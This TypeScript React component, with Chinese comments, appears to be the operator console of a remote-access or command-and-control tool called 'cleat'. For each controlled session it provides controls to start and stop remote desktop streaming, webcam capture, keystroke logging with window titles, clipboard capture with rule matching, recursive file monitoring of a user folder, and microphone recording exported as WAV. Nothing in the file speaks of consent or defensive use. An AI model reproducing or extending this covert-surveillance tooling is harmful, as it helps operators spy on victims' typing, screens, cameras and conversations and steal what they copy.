// 监控中心面板(真实对接 ): 对齐老版 MonitorPage ——
// 桌面流 / 摄像头 / 键盘记录 / 剪贴板 / 文件监控 / 录音 六个子标签。
// 数据流: 启停命令经 cleat-monitor 下发; 帧与日志经会话级 SSE 回推
// (keylog / clipboard_data / file_change / deskstream_data / camstream_data / audio_data)。
// 平台裁剪: 摄像头 / 键盘记录 / 录音 在 Linux 会话禁用(Agent 侧不支持, 与老版一致)。
// 大画面: 桌面/摄像头/音频的整页视图在「音视频监控」(作战导航), 本面板为工作区紧凑视图。
// 收尾: 关闭标签 = 停掉本面板启动的流(与老版页面卸载停流语义一致; 不动其他面板的流)。
import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useQuery } from '@tanstack/react-query'
import { useNavigate } from '@tanstack/react-router'
import { Camera, Clipboard, Expand, FileSearch, Mic, Monitor, Pause, Play, Trash2 } from 'lucide-react'
import { toast } from 'sonner'
import { listSessions, type CleatEvent } from '@/lib/cleat-api'
import {
  startAudioRecording,
  startCameraStream,
  startClipboardMonitor,
  startDesktopStream,
  startFileMonitor,
  startKeylog,
  stopAudioRecording,
  stopCameraStream,
  stopClipboardMonitor,
  stopDesktopStream,
  stopFileMonitor,
  stopKeylog,
} from '@/lib/cleat-monitor'
import { isLinuxOs } from '@/lib/platform'
import { useCanWrite } from '@/hooks/use-can-write'
import { cn } from '@/lib/utils'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { CameraSurface, DesktopSurface } from '@/features/stream/stream-content'
import { useMediaStream } from '@/features/stream/use-media-stream'
import { fmtClock } from '@/features/stream/stream-utils'

type Feature = 'desktop' | 'camera' | 'keyboard' | 'clipboard' | 'file' | 'recording'

const FEATURE_LABEL: Record<Feature, string> = {
  desktop: '桌面流',
  camera: '摄像头',
  keyboard: '键盘记录',
  clipboard: '剪贴板监控',
  file: '文件监控',
  recording: '录音',
}

const STOP_FN: Record<Feature, (sessionId: number) => Promise<unknown>> = {
  desktop: stopDesktopStream,
  camera: stopCameraStream,
  keyboard: stopKeylog,
  clipboard: stopClipboardMonitor,
  file: stopFileMonitor,
  recording: stopAudioRecording,
}

type LogTab = 'keyboard' | 'clipboard' | 'file'
interface LogEntry {
  id: number
  time: string
  text: string
  tag?: string
}

const MAX_LOGS = 500

export function MonitorPanel({ sessionId }: { sessionId: number }) {
  const navigate = useNavigate()
  const canWrite = useCanWrite()

  // ---- 会话平台(摄像头/键盘/录音的平台裁剪依据; 与其他面板共用 ['sessions'] 缓存) ----
  const sessionsQuery = useQuery({ queryKey: ['sessions'], queryFn: listSessions, refetchInterval: 5000 })
  const session = sessionsQuery.data?.sessions.find((s) => s.id === sessionId)
  const online = !!session?.online
  const linux = useMemo(() => isLinuxOs(session?.os || ''), [session?.os])

  // ---- 面板状态 ----
  const [paused, setPaused] = useState(false)
  const [running, setRunning] = useState<Record<Feature, boolean>>({
    desktop: false,
    camera: false,
    keyboard: false,
    clipboard: false,
    file: false,
    recording: false,
  })
  const [busy, setBusy] = useState<Record<Feature, boolean>>({
    desktop: false,
    camera: false,
    keyboard: false,
    clipboard: false,
    file: false,
    recording: false,
  })
  const [desktopInterval, setDesktopInterval] = useState(500)
  const [cameraInterval, setCameraInterval] = useState(1000)
  const [watchPath, setWatchPath] = useState('C:\\Users\\Administrator')
  const [logs, setLogs] = useState<Record<LogTab, LogEntry[]>>({ keyboard: [], clipboard: [], file: [] })

  const seqRef = useRef(0)
  const busyRef = useRef<Set<Feature>>(new Set())
  /** 本面板启动过的流(关闭标签时只收尾这些, 不动 av-monitor 等其他面板的流) */
  const startedRef = useRef<Set<Feature>>(new Set())

  const pushLog = useCallback((tab: LogTab, text: string, tag?: string, ts?: number) => {
    setLogs((prev) => {
      const list = [{ id: ++seqRef.current, time: fmtClock(ts ?? Date.now()), text, tag }, ...(prev[tab] || [])]
      return { ...prev, [tab]: list.slice(0, MAX_LOGS) }
    })
  }, [])

  // ---- 非媒体事件: 键盘 / 剪贴板 / 文件变更 ----
  const handleStreamEvent = useCallback(
    (ev: CleatEvent) => {
      const d = (ev.data || {}) as Record<string, unknown>
      switch (ev.type) {
        case 'keylog': {
          const entries = d.entries
          if (Array.isArray(entries)) {
            for (const e of entries as Array<Record<string, unknown>>) {
              pushLog(
                'keyboard',
                `[${String(e.window || '未知窗口')}] ${String(e.keys || '')}`,
                '输入',
                typeof e.time === 'number' ? e.time : undefined
              )
            }
          }
          break
        }
        case 'clipboard_data': {
          if (d.type === 'files') {
            const n = Array.isArray(d.files) ? (d.files as unknown[]).length : 0
            pushLog('clipboard', `复制文件列表: ${n} 个`, '文件', typeof d.ts === 'number' ? d.ts : undefined)
          } else {
            pushLog(
              'clipboard',
              String(d.text || '').slice(0, 500),
              d.matched_rule ? `命中规则 ${d.matched_rule}` : '文本',
              typeof d.ts === 'number' ? d.ts : undefined
            )
          }
          break
        }
        case 'file_change':
          pushLog(
            'file',
            `${String(d.action || 'change')}: ${String(d.path || '')}`,
            String(d.action || ''),
            typeof d.ts === 'number' ? d.ts : undefined
          )
          break
      }
    },
    [pushLog]
  )

  // ---- 媒体流(桌面帧 / 摄像头帧 / 音频帧; 渲染与暂停语义在钩子内) ----
  const media = useMediaStream(sessionId, { paused, onEvent: handleStreamEvent })

  // ---- 启停 ----
  const doStart = useCallback(
    (f: Feature) => {
      switch (f) {
        case 'desktop':
          return startDesktopStream(sessionId, { interval: desktopInterval })
        case 'camera':
          return startCameraStream(sessionId, { interval: cameraInterval })
        case 'keyboard':
          return startKeylog(sessionId, 2000)
        case 'clipboard':
          return startClipboardMonitor(sessionId, 1000)
        case 'file':
          return startFileMonitor(sessionId, watchPath.trim() || 'C:\\', true)
        case 'recording':
          return startAudioRecording(sessionId)
      }
    },
    [sessionId, desktopInterval, cameraInterval, watchPath]
  )

  const toggle = useCallback(
    async (f: Feature) => {
      if (!canWrite) {
        toast.warning('当前角色无监控操作权限')
        return
      }
      if (busyRef.current.has(f)) return
      busyRef.current.add(f)
      setBusy((b) => ({ ...b, [f]: true }))
      const start = !running[f]
      try {
        if (start) {
          await doStart(f)
          startedRef.current.add(f)
        } else {
          await STOP_FN[f](sessionId)
          startedRef.current.delete(f)
        }
        setRunning((r) => ({ ...r, [f]: start }))
        toast.success(`${FEATURE_LABEL[f]}已${start ? '开始' : '停止'}`)
      } catch (e) {
        toast.error(`${FEATURE_LABEL[f]}${start ? '启动' : '停止'}失败: ${(e as Error).message}`)
      } finally {
        busyRef.current.delete(f)
        setBusy((b) => ({ ...b, [f]: false }))
      }
    },
    [canWrite, doStart, running, sessionId]
  )

  // 关闭标签时收尾: 只停本面板启动过的流
  useEffect(() => {
    const started = startedRef.current
    return () => {
      for (const f of started) {
        void STOP_FN[f](sessionId).catch(() => undefined)
      }
      started.clear()
    }
  }, [sessionId])

  const clearLogs = (tab: LogTab) => setLogs((prev) => ({ ...prev, [tab]: [] }))

  /** 启停按钮(running=停止态; 会话离线时禁开始——停不受限, 便于收尾) */
  const toggleBtn = (f: Feature, extraDisabled = false) => (
    <Button
      size='sm'
      variant={running[f] ? 'destructive' : 'default'}
      className='h-7 text-xs'
      disabled={busy[f] || (!running[f] && (!online || !canWrite || extraDisabled))}
      onClick={() => void toggle(f)}
    >
      {busy[f] ? '…' : running[f] ? '停止' : '开始'}
    </Button>
  )

  return (
    <Tabs defaultValue='desktop' className='flex h-full min-h-0 flex-col gap-0'>
      {/* 工具条: 标签 + 实时/暂停(暂停只停渲染, 流不中断) */}
      <div className='flex items-center justify-between gap-2 px-2 pt-1.5'>
        <TabsList>
          <TabsTrigger value='desktop'>
            <Monitor className='size-3.5' />
            桌面流
          </TabsTrigger>
          <TabsTrigger value='camera' disabled={linux}>
            <Camera className='size-3.5' />
            摄像头
          </TabsTrigger>
          <TabsTrigger value='keyboard' disabled={linux}>
            键盘记录
          </TabsTrigger>
          <TabsTrigger value='clipboard'>
            <Clipboard className='size-3.5' />
            剪贴板
          </TabsTrigger>
          <TabsTrigger value='filemon'>
            <FileSearch className='size-3.5' />
            文件监控
          </TabsTrigger>
          <TabsTrigger value='audio' disabled={linux}>
            <Mic className='size-3.5' />
            录音
          </TabsTrigger>
        </TabsList>
        <Button
          size='sm'
          variant={paused ? 'default' : 'ghost'}
          className='h-7 gap-1 text-xs'
          title={paused ? '当前已暂停, 点击恢复实时数据' : '点击暂停渲染(流仍在推送, 只是不显示)'}
          onClick={() => setPaused((p) => !p)}
        >
          {paused ? <Play className='size-3.5' /> : <Pause className='size-3.5' />}
          {paused ? '已暂停' : '实时'}
        </Button>
      </div>

      {/* ---- 桌面流 ---- */}
      <TabsContent
        value='desktop'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex flex-wrap items-center gap-2'>
          <span className='text-xs text-muted-foreground'>{media.desktopInfo}</span>
          <div className='ms-auto flex items-center gap-2'>
            <span className='text-xs text-muted-foreground'>间隔</span>
            <Input
              type='number'
              min={100}
              max={60000}
              value={desktopInterval}
              onChange={(e) => setDesktopInterval(Number(e.target.value) || 500)}
              className='h-7 w-24 text-xs'
            />
            <span className='text-xs text-muted-foreground'>ms</span>
            <Button
              size='sm'
              variant='outline'
              className='h-7 gap-1 text-xs'
              onClick={() => navigate({ to: '/av-monitor', search: { session: sessionId, kind: 'desktop' } })}
            >
              <Expand className='size-3.5' />
              大画面
            </Button>
            {toggleBtn('desktop')}
          </div>
        </div>
        <DesktopSurface
          canvasRef={media.desktopCanvasRef}
          hasFrame={media.desktopHasFrame}
          hint={online ? '点击「开始」后此处显示远程桌面画面' : '会话离线 —— 上线后可开启桌面流'}
        />
      </TabsContent>

      {/* ---- 摄像头 ---- */}
      <TabsContent
        value='camera'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex flex-wrap items-center gap-2'>
          <span className='text-xs text-muted-foreground'>{media.cameraInfo}</span>
          <div className='ms-auto flex items-center gap-2'>
            <span className='text-xs text-muted-foreground'>间隔</span>
            <Input
              type='number'
              min={100}
              max={60000}
              value={cameraInterval}
              onChange={(e) => setCameraInterval(Number(e.target.value) || 1000)}
              className='h-7 w-24 text-xs'
            />
            <span className='text-xs text-muted-foreground'>ms</span>
            <Button
              size='sm'
              variant='outline'
              className='h-7 gap-1 text-xs'
              onClick={() => navigate({ to: '/av-monitor', search: { session: sessionId, kind: 'camera' } })}
            >
              <Expand className='size-3.5' />
              大画面
            </Button>
            {toggleBtn('camera', linux)}
          </div>
        </div>
        <CameraSurface
          src={media.cameraImg}
          hint={linux ? 'Linux 会话不支持摄像头采集' : online ? '点击「开始」后此处显示摄像头画面' : '会话离线'}
        />
      </TabsContent>

      {/* ---- 键盘记录 ---- */}
      <TabsContent
        value='keyboard'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex items-center gap-2'>
          {toggleBtn('keyboard', linux)}
          <Button size='sm' variant='ghost' className='h-7 gap-1 text-xs' onClick={() => clearLogs('keyboard')}>
            <Trash2 className='size-3.5' />
            清空
          </Button>
          <span className='ms-auto text-xs text-muted-foreground'>
            {linux ? 'Linux 会话不支持键盘记录' : running.keyboard ? '记录中…' : '未启动'}
          </span>
        </div>
        <LogList rows={logs.keyboard} empty={canWrite ? '暂无数据，先点击「开始」…' : '暂无数据'} tone='amber' />
      </TabsContent>

      {/* ---- 剪贴板 ---- */}
      <TabsContent
        value='clipboard'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex items-center gap-2'>
          {toggleBtn('clipboard')}
          <Button size='sm' variant='ghost' className='h-7 gap-1 text-xs' onClick={() => clearLogs('clipboard')}>
            <Trash2 className='size-3.5' />
            清空
          </Button>
          <span className='ms-auto text-xs text-muted-foreground'>{running.clipboard ? '监控中…' : '未启动'}</span>
        </div>
        <LogList rows={logs.clipboard} empty={canWrite ? '暂无数据，先点击「开始」…' : '暂无数据'} tone='sky' />
      </TabsContent>

      {/* ---- 文件监控 ---- */}
      <TabsContent
        value='filemon'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex flex-wrap items-center gap-2'>
          <Input
            value={watchPath}
            onChange={(e) => setWatchPath(e.target.value)}
            className='h-7 w-72 text-xs'
            placeholder='监控路径'
            disabled={running.file}
          />
          {toggleBtn('file')}
          <Button size='sm' variant='ghost' className='h-7 gap-1 text-xs' onClick={() => clearLogs('file')}>
            <Trash2 className='size-3.5' />
            清空
          </Button>
          <span className='ms-auto text-xs text-muted-foreground'>
            {running.file ? `监控中 · ${watchPath}（含子目录）` : '未启动'}
          </span>
        </div>
        <LogList rows={logs.file} empty={canWrite ? '暂无数据，先点击「开始」…' : '暂无数据'} tone='emerald' />
      </TabsContent>

      {/* ---- 录音 ---- */}
      <TabsContent
        value='audio'
        forceMount
        className='mx-2 mb-2 mt-2 flex min-h-0 flex-1 flex-col gap-2 data-[state=inactive]:hidden'
      >
        <div className='flex flex-wrap items-center gap-2'>
          {toggleBtn('recording', linux)}
          <Button
            size='sm'
            variant='outline'
            className='h-7 text-xs'
            disabled={media.audioBytes === 0}
            onClick={() => {
              const n = media.saveWav()
              if (n > 0) toast.success(`已保存录音 (${(n / 1024).toFixed(0)} KB)`)
              else toast.warning('没有录音数据')
            }}
          >
            保存 WAV
          </Button>
          <Button
            size='sm'
            variant='ghost'
            className='h-7 text-xs'
            disabled={media.audioBytes === 0}
            onClick={() => media.clearAudio()}
          >
            清空
          </Button>
          <Button
            size='sm'
            variant='outline'
            className='h-7 gap-1 text-xs'
            onClick={() => navigate({ to: '/av-monitor', search: { session: sessionId, kind: 'audio' } })}
          >
            <Expand className='size-3.5' />
            大画面
          </Button>
          <span className='ms-auto text-xs text-muted-foreground'>
            {linux ? 'Linux 会话不支持录音' : media.audioStatus}
          </span>
        </div>
        <div className='flex min-h-0 flex-1 flex-col items-center justify-center gap-4 rounded-lg border bg-[#0a0f14]'>
          <div className='flex h-20 items-end gap-0.5 px-8'>
            {Array.from({ length: 48 }).map((_, i) => (
              <span
                key={i}
                className={cn('w-1 rounded-sm transition-all duration-300', running.recording ? 'bg-emerald-500' : 'bg-slate-700')}
                style={{ height: running.recording ? `${20 + ((i * 37) % 80)}%` : '4%' }}
              />
            ))}
          </div>
          <p className='text-xs text-muted-foreground'>
            PCM 音频经 SSE（audio_data）推送，边收边播；停止后可导出 WAV · 已缓冲{' '}
            {(media.audioBytes / 1024).toFixed(0)} KB
          </p>
        </div>
      </TabsContent>
    </Tabs>
  )
}

/** 滚动日志列表(键盘/剪贴板/文件监控共用; 新→旧) */
function LogList({ rows, empty, tone }: { rows: LogEntry[]; empty: string; tone: 'amber' | 'sky' | 'emerald' }) {
  const toneCls = {
    amber: 'border-amber-500/40 text-amber-400',
    sky: 'border-sky-500/40 text-sky-400',
    emerald: 'border-emerald-500/40 text-emerald-400',
  }[tone]
  return (
    <div className='min-h-0 flex-1 overflow-y-auto rounded-lg border bg-[#09090b] p-2.5 font-mono text-xs leading-relaxed'>
      {rows.length === 0 ? (
        <p className='py-8 text-center text-muted-foreground'>{empty}</p>
      ) : (
        rows.map((l) => (
          <div key={l.id} className='flex gap-2 border-b border-zinc-900 py-0.5'>
            <span className='shrink-0 text-zinc-600'>{l.time}</span>
            {l.tag && (
              <Badge variant='outline' className={cn('shrink-0 rounded-sm px-1 py-0 font-mono text-[10px]', toneCls)}>
                {l.tag}
              </Badge>
            )}
            <span className='break-all text-zinc-300'>{l.text}</span>
          </div>
        ))
      )}
    </div>
  )
}
